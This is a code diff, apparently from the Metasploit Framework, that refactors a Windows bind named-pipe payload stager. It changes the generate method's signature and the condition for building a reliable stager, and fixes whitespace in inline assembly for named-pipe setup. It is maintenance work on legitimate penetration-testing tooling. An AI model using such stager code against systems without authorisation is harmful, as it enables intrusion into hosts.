@@ -1,11 +1,5 @@
 # -*- coding: binary -*-
 
-require 'msf/core'
-require 'msf/core/payload/transport_config'
-require 'msf/core/payload/windows/send_uuid'
-require 'msf/core/payload/windows/block_api'
-require 'msf/core/payload/windows/exitfunk'
-
 module Msf
 
 ###
@@ -36,7 +30,7 @@ module Payload::Windows::BindNamedPipe
   #
   # Generate the first stage
   #
-  def generate
+  def generate(_opts = {})
     conf = {
       name:        datastore['PIPENAME'],
       host:        datastore['PIPEHOST'],
@@ -45,7 +39,7 @@ module Payload::Windows::BindNamedPipe
     }
 
     # Generate the advanced stager if we have space
-    unless self.available_space.nil? || required_space > self.available_space
+    if self.available_space && cached_size && required_space <= self.available_space
       conf[:reliable] = true
       conf[:exitfunk] = datastore['EXITFUNC']
     end
@@ -110,7 +104,7 @@ module Payload::Windows::BindNamedPipe
 
   #
   # hPipe must be in edi. eax will contain WriteFile return value
-  # 
+  #
   def asm_send_uuid(uuid=nil)
     uuid ||= generate_payload_uuid
     uuid_raw = uuid.to_raw
@@ -155,7 +149,7 @@ module Payload::Windows::BindNamedPipe
         push #{chunk_size}      ; nInBufferSize
         push #{chunk_size}      ; nOutBufferSize
         push 255                ; nMaxInstances (PIPE_UNLIMITED_INSTANCES). in case pipe isn't released
-        push #{pipe_mode}       ; dwPipeMode 
+        push #{pipe_mode}       ; dwPipeMode
         push 3                  ; dwOpenMode (PIPE_ACCESS_DUPLEX)
         call get_pipe_name      ; lpName
         db "#{full_pipe_name}", 0x00
